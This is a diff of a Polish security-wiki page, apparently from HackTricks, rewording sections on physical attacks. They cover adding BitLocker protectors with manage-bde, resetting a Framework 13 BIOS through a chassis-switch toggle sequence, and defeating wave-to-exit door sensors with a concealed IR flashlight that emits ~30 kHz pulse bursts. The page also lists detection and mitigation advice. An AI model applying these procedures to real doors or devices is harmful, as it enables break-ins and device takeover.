+Atakujący, który nakłoni administratora do uruchomienia poleceń zarządzających BitLockerem, może dodać protector oparty na haśle odzyskiwania, kluczu zewnętrznym lub innym mechanizmie, a następnie go przechwycić. Hasło odzyskiwania nie może być dowolnym ciągiem zer: numeryczne hasła odzyskiwania BitLocker muszą mieć prawidłowy, 48-cyfrowy format. Składnia odpowiednia do autoryzowanego administrowania to `manage-bde -protectors -add C: -recoverypassword`; dodane protectory można wyświetlić poleceniem `manage-bde -protectors -get C:`. Monitoruj dodawanie protectorów i dopilnuj, aby nowy materiał odzyskiwania był przechowywany wyłącznie w zatwierdzonych lokalizacjach.<sup>[[16]](#references)</sup>
 
 ---
 
-## Wykorzystanie przełączników otwarcia obudowy / serwisowych do przywrócenia ustawień fabrycznych BIOS-u
+## Wykorzystanie przełączników otwarcia obudowy / konserwacyjnych do przywrócenia ustawień fabrycznych BIOS-u
 
-Wiele nowoczesnych laptopów i komputerów stacjonarnych w małych obudowach ma **przełącznik otwarcia obudowy**, monitorowany przez kontroler Embedded Controller (EC) i firmware BIOS/UEFI. Głównym zadaniem przełącznika jest zgłaszanie alarmu po otwarciu urządzenia, ale niektórzy producenci implementują **nieudokumentowany skrót odzyskiwania**, uruchamiany po przełączeniu go w określonej sekwencji.<sup>[[5]](#references)[[6]](#references)</sup>
+Wiele nowoczesnych laptopów i komputerów stacjonarnych o małej obudowie ma **przełącznik otwarcia obudowy**, monitorowany przez Embedded Controller (EC) i firmware BIOS/UEFI. Chociaż głównym zadaniem przełącznika jest zgłaszanie alertu po otwarciu urządzenia, producenci czasami implementują **nieudokumentowany skrót odzyskiwania**, uruchamiany po przełączeniu go w określonej sekwencji.<sup>[[5]](#references)[[6]](#references)</sup>
 
 ### Jak działa atak
 
-1. Przełącznik jest podłączony do **przerwania GPIO** kontrolera EC.
-2. Firmware działający na kontrolerze EC śledzi **czas i liczbę naciśnięć**.
-3. Po rozpoznaniu zakodowanej na stałe sekwencji kontroler EC uruchamia procedurę *resetu płyty głównej*, która **usuwa zawartość systemowej pamięci NVRAM/CMOS**.
-4. Przy kolejnym uruchomieniu urządzenia modele, których dotyczy ta funkcja, ładują zresetowany stan firmware’u. W zależności od producenta i wersji wyczyszczony stan może obejmować hasło nadzorcy, niestandardowe ustawienia rozruchu lub zarejestrowane klucze Secure Boot; stan TPM i wpływ na szyfrowanie dysku należy ocenić osobno.
+1. Przełącznik jest podłączony do **przerwania GPIO** w EC.
+2. Firmware działający na EC śledzi **czas i liczbę naciśnięć**.
+3. Po rozpoznaniu zakodowanej na stałe sekwencji EC uruchamia procedurę *mainboard-reset*, która **kasuje zawartość systemowej pamięci NVRAM/CMOS**.
+4. Przy następnym uruchomieniu urządzenia modele, których to dotyczy, wczytują zresetowany stan firmware. W zależności od producenta i wersji, wyczyszczony stan może obejmować hasło nadzorcy, niestandardowe ustawienia rozruchu lub zarejestrowane klucze Secure Boot; stan TPM i skutki dla szyfrowania dysku należy ocenić osobno.
 
-> Reset firmware’u może przywrócić opcje rozruchu z urządzeń zewnętrznych, ale **nie** odszyfrowuje pamięci masowej. BitLocker lub inny system szyfrowania całego dysku może po zmianach TPM/firmware’u zażądać klucza odzyskiwania, nadal chroniąc dysk wewnętrzny bez niego.<sup>[[16]](#references)</sup>
+> Reset firmware może przywrócić opcje uruchamiania z nośników zewnętrznych, ale **nie** odszyfrowuje pamięci masowej. BitLocker lub inny system szyfrowania całego dysku może po zmianach TPM/firmware zażądać odzyskania, nadal chroniąc dysk wewnętrzny bez klucza odzyskiwania.<sup>[[16]](#references)</sup>
 
-### Przykład z praktyki – laptop Framework 13
+### Przykład z rzeczywistego świata – laptop Framework 13
 
-Skrót odzyskiwania dla Framework 13 (11., 12. i 13. generacji) to:
+Skrót odzyskiwania w Framework 13 (11., 12. i 13. generacji) wygląda następująco:
 
 ```text
 Press intrusion switch  →  hold 2 s
@@ -157,46 +178,46 @@ Release                 →  wait 2 s
 (repeat the press/release cycle 10× while the machine is powered)
 ```
 
-Po dziesiątym cyklu EC ustawia flagę, która nakazuje BIOS-owi wyczyścić NVRAM podczas następnego uruchomienia. Cała procedura trwa około 40 s i wymaga **wyłącznie śrubokręta**.<sup>[[5]](#references)</sup>
+Po dziesiątym cyklu EC ustawia flagę nakazującą BIOS-owi wyczyszczenie pamięci NVRAM przy następnym uruchomieniu. Cała procedura trwa około 40 s i wymaga **jedynie śrubokręta**.<sup>[[5]](#references)</sup>
 
-### Ogólna procedura wykorzystania podatności
+### Ogólna procedura eksploatacji
 
-1. Włącz urządzenie docelowe lub wybudź je ze stanu uśpienia, aby EC działał.
-2. Zdejmij dolną pokrywę, aby odsłonić przełącznik wykrywania otwarcia/serwisowy.
-3. Odtwórz wzorzec przełączania specyficzny dla danego producenta (sprawdź dokumentację i fora lub przeprowadź reverse engineering firmware’u EC).
-4. Złóż urządzenie i uruchom je ponownie, a następnie sprawdź, które ustawienia firmware’u i dane uwierzytelniające faktycznie uległy zmianie.
-5. Jeśli masz upoważnienie i dostępne jest uruchamianie z nośnika zewnętrznego, uruchom kontrolowany obraz live. Gdy wewnętrzny wolumin zostanie legalnie odblokowany (lub nigdy nie był szyfrowany), środowisko live może pozyskać dane uwierzytelniające i dane albo sprawdzić EFI System Partition. Modyfikacja tej partycji w celu zainstalowania implantu EFI jest trwała i wysoce inwazyjna, a ponadto podlega ograniczeniom wynikającym z Secure Boot, measured boot, ochrony firmware’u przed zapisem oraz monitorowania punktów końcowych. Zaszyfrowana pamięć pozostaje niedostępna bez klucza lub materiału odzyskiwania.
+1. Włącz lub uśpij i wybudź urządzenie docelowe, aby uruchomić EC.
+2. Zdejmij dolną pokrywę, aby uzyskać dostęp do przełącznika wykrywania otwarcia/serwisowego.
+3. Odtwórz specyficzną dla producenta sekwencję przełączeń (sprawdź dokumentację i fora lub poddaj firmware EC inżynierii wstecznej).
+4. Złóż urządzenie i uruchom je ponownie, a następnie sprawdź, które ustawienia firmware i dane uwierzytelniające faktycznie uległy zmianie.
+5. Jeśli masz upoważnienie i dostępny jest rozruch z nośnika zewnętrznego, uruchom kontrolowany obraz live. Gdy wolumin wewnętrzny zostanie prawidłowo odblokowany (lub nigdy nie był szyfrowany), środowisko live może pozyskać dane uwierzytelniające i dane albo sprawdzić partycję EFI System. Modyfikacja tej partycji w celu zainstalowania implantu EFI jest trwała i wysoce inwazyjna, a ponadto podlega ograniczeniom związanym z Secure Boot, measured boot, ochroną firmware przed zapisem i monitorowaniem punktów końcowych. Zaszyfrowane nośniki pozostają niedostępne bez klucza lub materiału odzyskiwania.
 
 ### Wykrywanie i ograniczanie ryzyka
 
-* Rejestruj zdarzenia wykrycia otwarcia obudowy w konsoli zarządzania systemem operacyjnym i koreluj je z nieoczekiwanymi resetami BIOS-u.
-* Używaj **plomb zabezpieczających przed manipulacją** na śrubach/pokrywach, aby wykrywać otwarcie.
-* Przechowuj urządzenia w **fizycznie kontrolowanych strefach**; zakładaj, że dostęp fizyczny oznacza pełne przejęcie.
-* Jeśli jest taka możliwość, wyłącz funkcję producenta „reset przełącznikiem serwisowym” lub wymagaj dodatkowego uwierzytelnienia kryptograficznego przy resetowaniu NVRAM.
+* Rejestruj zdarzenia otwarcia obudowy w konsoli zarządzania systemem operacyjnym i koreluj je z nieoczekiwanymi resetami BIOS-u.
+* Stosuj **plomby zabezpieczające przed naruszeniem**, umieszczone na śrubach i pokrywach, aby wykrywać otwarcie.
+* Przechowuj urządzenia w **fizycznie zabezpieczonych miejscach**; zakładaj, że dostęp fizyczny oznacza pełne przejęcie urządzenia.
+* Jeśli to możliwe, wyłącz funkcję producenta „reset przez przełącznik serwisowy” lub wymagaj dodatkowego uwierzytelnienia kryptograficznego przy resetowaniu NVRAM.
 
 ---
 
-## Potajemne wstrzykiwanie IR w czujniki wyjścia bezdotykowego
+## Ukryte wstrzykiwanie sygnału IR do bezdotykowych czujników wyjścia
 
-### Charakterystyka czujnika
-- Popularne czujniki „wave-to-exit” łączą emiter diody LED bliskiej podczerwieni z odbiornikiem w stylu pilota do telewizora, który zgłasza stan wysoki na wyjściu logicznym dopiero po odebraniu wielu impulsów (~4–10) o właściwej częstotliwości nośnej (≈30 kHz).<sup>[[7]](#references)</sup>
-- Plastikowa osłona uniemożliwia nadajnikowi i odbiornikowi bezpośrednie widzenie się, więc kontroler zakłada, że każdy zweryfikowany sygnał nośny pochodzi od pobliskiego odbicia, i uruchamia przekaźnik otwierający zaczep drzwiowy.
-- Gdy kontroler uzna, że wykryto obiekt, często zmienia obwiednię modulacji sygnału wychodzącego, ale odbiornik nadal akceptuje każdy impuls pasujący do filtrowanego sygnału nośnego.
+### Charakterystyka czujników
+- Popularne czujniki „wave-to-exit” łączą emiter diody LED bliskiej podczerwieni z odbiornikiem podobnym do modułu z pilota TV, który zgłasza stan logiczny wysoki dopiero po wykryciu kilku impulsów (~4–10) o prawidłowej częstotliwości nośnej (≈30 kHz).<sup>[[7]](#references)</sup>
+- Plastikowa osłona blokuje bezpośrednią widoczność nadajnika przez odbiornik, więc kontroler zakłada, że każdy zweryfikowany sygnał nośny pochodzi od pobliskiego odbicia, i steruje przekaźnikiem, który otwiera elektrozaczep drzwi.
+- Gdy kontroler wykryje obecność celu, często zmienia obwiednię modulacji sygnału wyjściowego, ale odbiornik nadal akceptuje każdy impuls pasujący do przefiltrowanego sygnału nośnego.
 
 ### Przebieg ataku
-1. **Zarejestruj profil emisji** – podłącz analizator logiczny do pinów kontrolera, aby zarejestrować przebiegi przed detekcją i po niej, które sterują wewnętrzną diodą LED IR.
-2. **Odtwórz tylko przebieg „po detekcji”** – odłącz lub zignoruj fabryczny nadajnik i steruj zewnętrzną diodą LED IR, od początku emitując wzorzec po wykryciu. Ponieważ odbiornik sprawdza tylko liczbę impulsów i częstotliwość, uznaje podrobiony sygnał nośny za prawdziwe odbicie i aktywuje linię przekaźnika.
-3. **Włącz bramkowanie transmisji** – nadawaj sygnał nośny w dostrojonych seriach (np. przez kilkadziesiąt milisekund, z podobnymi przerwami), aby dostarczyć minimalną liczbę impulsów bez nasycania układu AGC odbiornika ani logiki obsługi zakłóceń. Ciągła emisja szybko obniża czułość czujnika i uniemożliwia zadziałanie przekaźnika.
+1. **Zarejestruj profil emisji** – podłącz analizator stanów logicznych do pinów kontrolera, aby zarejestrować przebiegi przed detekcją i po niej, które sterują wewnętrzną diodą IR.
+2. **Odtwórz tylko przebieg „po detekcji”** – odłącz lub zignoruj fabryczny nadajnik i steruj zewnętrzną diodą IR wzorcem, który normalnie pojawia się po wyzwoleniu, od samego początku. Ponieważ odbiornik reaguje wyłącznie na liczbę i częstotliwość impulsów, uznaje sfałszowany sygnał nośny za prawdziwe odbicie i aktywuje linię przekaźnika.
+3. **Steruj emisją impulsową** – nadawaj sygnał nośny w dobranych impulsach (np. przez kilkadziesiąt milisekund, z podobną przerwą), aby dostarczyć minimalną wymaganą liczbę impulsów bez nasycania AGC odbiornika ani układów obsługi zakłóceń. Ciągła emisja szybko zmniejsza czułość czujnika i uniemożliwia zadziałanie przekaźnika.
 
-### Zdalne wstrzykiwanie sygnału przez odbicia
-- Zastąpienie warsztatowej diody LED mocną diodą IR, sterownikiem MOSFET i optyką skupiającą pozwala niezawodnie wyzwalać czujnik z odległości ~6 m.
-- Atakujący nie musi znajdować się w polu widzenia apertury odbiornika; skierowanie wiązki na ściany wewnętrzne, regały lub ościeżnice widoczne przez szybę pozwala odbitej energii trafić w pole widzenia ~30° i naśladować ruch ręki z bliska.
-- Ponieważ odbiorniki oczekują jedynie słabych odbić, znacznie silniejsza wiązka zewnętrzna może odbijać się od wielu powierzchni i nadal przekraczać próg detekcji.
+### Dalekozasięgowe wstrzykiwanie sygnału przez odbicie
+- Zastąpienie diody LED używanej na stanowisku testowym diodą IR dużej mocy, sterownikiem MOSFET i optyką skupiającą umożliwia niezawodne wyzwalanie czujnika z odległości około 6 m.
+- Atakujący nie musi mieć bezpośredniej widoczności apertury odbiornika; skierowanie wiązki na widoczne przez szybę ściany wewnętrzne, regały lub ościeżnice pozwala odbitemu światłu trafić w pole widzenia o kącie około 30° i naśladować machnięcie dłonią z bliska.
+- Ponieważ odbiorniki oczekują jedynie słabych odbić, znacznie silniejsza zewnętrzna wiązka może odbijać się od wielu powierzchni i nadal przekraczać próg detekcji.
 
-### Latarka do ataku
-- Umieszczenie sterownika wewnątrz zwykłej latarki pozwala ukryć narzędzie na widoku. Zastąp widoczną diodę LED mocną diodą LED IR dopasowaną do pasma odbiornika, dodaj ATtiny412 (lub podobny układ) do generowania serii impulsów o częstotliwości ≈30 kHz i użyj MOSFET-a do odprowadzania prądu diody LED.
-- Teleskopowa soczewka zoom zawęża wiązkę, zwiększając jej zasięg i precyzję, a sterowany przez MCU silnik wibracyjny zapewnia haptyczne potwierdzenie aktywnej modulacji bez emisji światła widzialnego.
-- Przełączanie między kilkoma zapisanymi wzorcami modulacji (nieznacznie różniącymi się częstotliwościami nośnymi i obwiedniami) zwiększa zgodność z różnymi rodzinami czujników sprzedawanymi pod innymi markami. Operator może omiatać odbijające powierzchnie, aż przekaźnik kliknie i drzwi się otworzą.
+### Latarka przystosowana do ataku
+- Umieszczenie sterownika w komercyjnej latarce ukrywa narzędzie na widoku. Zastąp widoczną diodę LED diodą IR dużej mocy, dopasowaną do pasma odbiornika, dodaj ATtiny412 (lub podobny układ) do generowania impulsów o częstotliwości ≈30 kHz i użyj MOSFET-a do sterowania prądem diody LED.
+- Teleskopowy obiektyw z zoomem zawęża wiązkę, zwiększając zasięg i precyzję, a silnik wibracyjny sterowany przez MCU informuje haptycznie o aktywnej modulacji, bez emisji światła widzialnego.
+- Przełączanie między kilkoma zapisanymi wzorcami modulacji (nieco różniącymi się częstotliwością sygnału nośnego i obwiednią) zwiększa zgodność z rodzinami czujników sprzedawanymi pod różnymi markami. Dzięki temu operator może kierować wiązkę na różne powierzchnie odbijające, aż przekaźnik kliknie i drzwi się otworzą.
 
 ---
 
@@ -220,5 +241,11 @@ Po dziesiątym cyklu EC ustawia flagę, która nakazuje BIOS-owi wyczyścić NVR
 - [16] [Microsoft Learn - BitLocker operations guide](https://learn.microsoft.com/en-us/windows/security/operating-system-security/data-protection/bitlocker/operations-guide)
 - [17] [Microsoft Learn - holding Shift and automatic logon behavior](https://learn.microsoft.com/en-us/troubleshoot/windows-client/user-profiles-and-logon/hold-shift-key-shutting-down-not-disable-automatic-logon)
 - [18] [CGSecurity - CmosPwd documentation and downloads](https://www.cgsecurity.org/wiki/CmosPwd)
+- [19] [Kali Linux Documentation - NetHunter USB-Arsenal](https://www.kali.org/docs/nethunter/nethunter-usbarsenal/)
+- [20] [Linux kernel documentation - USB HID gadget driver](https://docs.kernel.org/usb/gadget_hid.html)
+- [21] [USB Gadget Tool](https://github.com/tejado/android-usb-gadget)
+- [22] [NFC-to-HID](https://github.com/androidmalware/NFC-to-HID)
+- [23] [NfcScreenOff](https://github.com/Jon8RFC/NfcScreenOff)
+- [24] [Turn a Rooted Android Phone into an NFC Authenticator and Automation Tool for Your PC](https://mobile-hacker.com/2026/09/21/turn-a-rooted-android-phone-into-an-nfc-authenticator-and-automation-tool-for-your-pc/)
 
 {{#include ../banners/hacktricks-training.md}}
